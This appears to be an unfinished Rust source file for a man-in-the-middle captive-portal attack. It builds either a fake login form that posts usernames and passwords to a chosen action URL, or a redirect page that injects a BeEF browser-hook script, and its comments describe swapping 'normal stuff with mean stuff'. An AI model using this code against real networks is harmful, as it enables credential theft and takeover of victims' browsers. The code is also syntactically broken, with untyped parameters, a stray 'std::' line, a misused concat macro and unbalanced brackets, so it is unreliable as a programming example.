/*HTML for the login*/
//Add beef hook conditional to replace normal stuff with mean stuff
/*
<!DOCTYPE html>
<html lang="en">
  <head>
    <meta charset="utf-8">
    <title>Hello!</title>
  </head>
  <body>
    <h1>Hello!</h1>
    <p>Hi from Rust</p>
  </body>
</html>
*/

/* Bad request response*/
// add stuff here
/*
<!DOCTYPE html>
<html lang="en">
  <head>
    <meta charset="utf-8">
    <title>Hello!</title>
  </head>
  <body>
    <h1>Oops!</h1>
    <p>Sorry, I don't know what you're asking for.</p>
  </body>
</html>
*/
fn make_html( hook_loc,  redirect,  formaction, form_or_redirect) {

    let html_redirect_body;

    let html_form_body;

    let hook_location = hook_loc;

    let redirect_ip = redirect;

    // build the form
    let html_login_head       ="<!DOCTYPE html><html><head><meta charset=\"utf-8\" /><title></title></head>";
    
    let html_form_body_top    = "<body><form class=\"login\" ";
    // form action
    let form_action           = format!("{}{}{}" , "\"action=\"" , formaction , "\"";
    std::
    let html_form_body_bottom = " method=\"post\">\
                                <input type=\"text\" name=\"username\" value=\"username\">\
                                <input type=\"text\" name=\"password\" value=\"password\">\
                                <input type=\"submit\" name=\"submit\" value=\"submit\">\
                                </form>\
                                </body>\
                                </html>";
    // build the redirect
    let html_redirect_head   = "<html><head>";
    let beef_hook            = format!("{}{}{}" , "<script src=" , hook_loc ,"></script>");
    let html_redirect_middle = format!("{}{}{}" , "<meta http-equiv=\"refresh\" content=\"0; url=http://" , redirect_ip , "\" />");
    let redirect_bottom      = "</head><body><b>Redirecting to MITM hoasted captive portal page</b></body></html>";

    // Determine if the user wants the form or the redirect
    if form_or_redirect == true {
        let html_redirect_body = std::concat!() html_redirect_head + beef_hook + html_redirect_middle + redirect_bottom;
        return html_redirect_body;
    else if (form_or_redirect == false{
        html_form_body = html_login_head + html_form_body_top + form_action + html_form_body_bottom;
        return html_form_body;
    };
};